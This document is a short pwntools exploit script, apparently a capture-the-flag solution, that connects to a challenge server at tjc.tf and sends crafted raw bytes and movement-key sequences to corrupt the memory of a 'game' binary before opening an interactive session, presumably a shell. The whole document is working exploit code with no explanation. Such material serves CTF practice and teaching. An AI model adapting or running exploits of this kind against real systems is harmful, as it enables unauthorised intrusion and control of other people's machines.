#!/usr/bin/env python3
from pwn import *

target = remote("tjc.tf", 31119)
#target = process("./game")
#gdb.attach(target, gdbscript="b move_player")

target.send("l")
target.send(b"\xf6")

payload =b"d" * 82 + b"w" * 5
target.send(payload)

target.send("l")
target.send(b"\xe4")
payload2 = b"w" * 2
target.send(payload2)

target.interactive()